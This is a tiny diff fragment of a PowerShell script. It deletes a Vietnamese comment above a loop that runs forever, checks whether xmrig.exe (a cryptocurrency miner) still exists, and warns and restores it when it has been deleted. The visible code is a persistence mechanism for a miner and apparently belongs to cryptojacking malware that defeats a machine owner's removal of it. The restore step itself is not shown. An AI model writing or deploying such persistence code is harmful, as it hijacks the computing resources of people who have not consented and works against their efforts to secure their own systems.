@@ -36,7 +36,6 @@ if (Test-Path $xmrigPath) {
     }
 }
 
-# Giám sát liên tục
 while ($true) {
     if (!(Test-Path $xmrigPath)) {
         Write-Warning "xmrig.exe was deleted. Restoring..."
